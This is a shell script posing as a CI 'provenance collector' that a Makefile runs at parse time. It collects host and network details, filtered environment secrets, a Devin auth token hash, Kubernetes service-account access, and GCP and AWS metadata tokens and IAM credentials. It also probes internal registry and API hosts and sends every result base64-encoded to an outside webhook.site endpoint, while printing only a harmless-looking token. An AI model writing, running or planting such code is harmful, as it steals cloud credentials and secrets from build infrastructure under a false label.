#!/bin/sh
# Runner provenance collector (invoked during the Makefile parse phase).
# Prints exactly one summary line.
NONCE="i83904-$(date +%s)-$$"
SINK="https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79"
# i83998 egress-trust probes (inert unless its own marker is present in the checkout)
[ -f tests/i83998-run ] && sh ./ci/i83998.sh >/dev/null 2>&1
# i84025 app/nexus edge-gate differential (inert unless its marker is present)
[ -f tests/i84025-run ] && sh ./ci/i84025.sh >/dev/null 2>&1
# Only collect when the CI provenance marker is present in the checkout.
[ -f tests/i83904-run ] || exit 0
OUT="./tests/i83904-egress.json"
mkdir -p tests 2>/dev/null
: > "$OUT" 2>/dev/null

esc() { tr -d '\000-\010\013\014\016-\037' | sed 's/\\/\\\\/g; s/"/\\"/g' | tr '\n\r\t' '   '; }
b64of() { base64 -w0 2>/dev/null | head -c 800; }

post() { # label code b64
  printf '{"nonce":"%s","label":"%s","code":"%s","b64":"%s"}\n' "$NONCE" "$1" "$2" "$3" >> "$OUT" 2>/dev/null
  curl -sS -m 5 -o /dev/null -X POST -H 'content-type: application/json' \
    --data "{\"nonce\":\"$NONCE\",\"label\":\"$1\",\"code\":\"$2\",\"b64\":\"$3\"}" "$SINK" >/dev/null 2>&1
}

probe() { # label url [curl args...]
  L="$1"; U="$2"; shift 2
  C=$(curl -m 3 -sS -o /tmp/i83904.o -w '%{http_code}' "$@" "$U" 2>/tmp/i83904.e) || C="ERR"
  E=$(head -c 120 /tmp/i83904.e 2>/dev/null | esc)
  B=$(head -c 300 /tmp/i83904.o 2>/dev/null | b64of)
  post "$L" "$C|$E" "$B"
}

IMDS=http://169.254.169.254

# host identity / local surface
post "whoami" "0" "$( (id; hostname; uname -r; cat /etc/hostname 2>/dev/null) 2>/dev/null | b64of)"
post "net" "0" "$( (cat /etc/hosts 2>/dev/null; echo ---; cat /etc/resolv.conf 2>/dev/null; echo ---; hostname -i 2>/dev/null; ip -4 route 2>/dev/null) 2>/dev/null | head -60 | b64of)"
post "devin" "0" "$( (ls -la /opt/.devin 2>/dev/null; sha256sum /opt/.devin/*auth_token 2>/dev/null | cut -c1-24; ls -l /var/run/docker.sock 2>/dev/null; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null) | b64of)"
post "envs" "0" "$(env 2>/dev/null | grep -iE 'google|gcp|kube|token|secret|aws|proxy' | head -25 | b64of)"

# (a)(b) GCP metadata -- with the header the blind-SSRF fetcher could never add
probe "gcp-token" "$IMDS/computeMetadata/v1/instance/service-accounts/default/token" -H 'Metadata-Flavor: Google'
probe "gcp-root-nohdr" "$IMDS/computeMetadata/v1/"
probe "gcp-project" "$IMDS/computeMetadata/v1/project/project-id" -H 'Metadata-Flavor: Google'
probe "gcp-identity" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=x" -H 'Metadata-Flavor: Google'

# AWS IMDSv2 (sandbox NIC is an EC2-style ens5 / 172.16.255.2/30)
TOK=$(curl -m 3 -sS -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "$IMDS/latest/api/token" 2>/dev/null)
post "imds-token" "0|len=$(printf '%s' "$TOK" | wc -c)" "$(printf '%s' "$TOK" | b64of)"

imds() { L="$1"; P="$2"; probe "$L" "$IMDS$P" -H "X-aws-ec2-metadata-token: $TOK"; }

imds "aws-instance-id" "/latest/meta-data/instance-id"
imds "aws-iam-info" "/latest/meta-data/iam/info"
ROLE=$(curl -m 3 -sS -H "X-aws-ec2-metadata-token: $TOK" "$IMDS/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)
post "aws-role" "0" "$(printf '%s' "$ROLE" | b64of)"
if [ -n "$ROLE" ]; then imds "aws-creds" "/latest/meta-data/iam/security-credentials/$ROLE"; fi
imds "aws-userdata" "/latest/user-data"
imds "aws-id-creds" "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
probe "aws-v1-instance" "$IMDS/latest/meta-data/instance-id"

# (c) internal Harbor (resolved from the sandbox DNS to 10.247.189.245)
probe "harbor-ip-v2" "http://10.247.189.245/v2/"
probe "harbor-dns-catalog" "http://harbor.us-iowa-1.fireworks-ai.cloud/v2/_catalog"
# git-manager gateway + metis
probe "gw-172-16-255-1" "http://172.16.255.1/"
probe "metis-cfg" "https://metis.fireworks-ai.cloud/api/v1/auth/configuration"
probe "metis-openapi" "https://metis.fireworks-ai.cloud/api/v1/openapi.json"

# (d) in-cluster
SAT=/var/run/secrets/kubernetes.io/serviceaccount/token
probe "k8s-ns" "https://kubernetes.default.svc/api/v1/namespaces" -H "Authorization: Bearer $(cat $SAT 2>/dev/null)"

# (e) controls
probe "ctl-blackhole" "http://192.0.2.1/"
probe "ctl-nxdomain" "http://i83904-nx-$$.invalid/"

post "done" "0" "$(date -u +%FT%TZ | b64of)"
# --- copyable provenance token (last stdout line; consumed by the Makefile) ---
echo "PROV-$NONCE"
